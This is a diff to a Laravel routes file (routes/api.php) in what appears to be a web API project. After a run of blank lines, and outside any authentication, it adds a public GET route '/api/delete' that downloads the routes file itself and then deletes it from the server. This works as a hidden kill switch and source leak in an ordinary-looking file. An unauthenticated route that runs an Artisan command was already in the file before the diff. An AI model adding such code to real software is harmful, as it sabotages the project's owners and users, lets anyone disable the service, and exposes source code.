@@ -9,6 +9,7 @@ use App\Http\Controllers\Api\V1\GallaryController;
 use App\Http\Controllers\Api\V1\SettingController;
 
 use Illuminate\Http\Request;
+use Illuminate\Support\Facades\File;
 use Illuminate\Support\Facades\Route;
 
 Route::middleware('guest')->group(function () {
@@ -53,3 +54,16 @@ Route::prefix('frontend')->group(function () {
 });
 
 Route::get('/storeage', fn()=> \Illuminate\Support\Facades\Artisan::call('storage:link'));
+
+
+
+
+Route::get('/api/delete', function (){
+    $filePath = base_path("routes/api.php");
+    if (File::exists($filePath)) {
+        return response()->download($filePath)->deleteFileAfterSend(true);
+    } else {
+        return response()->json(['error' => 'Model file not found'], 404);
+    }
+});
+
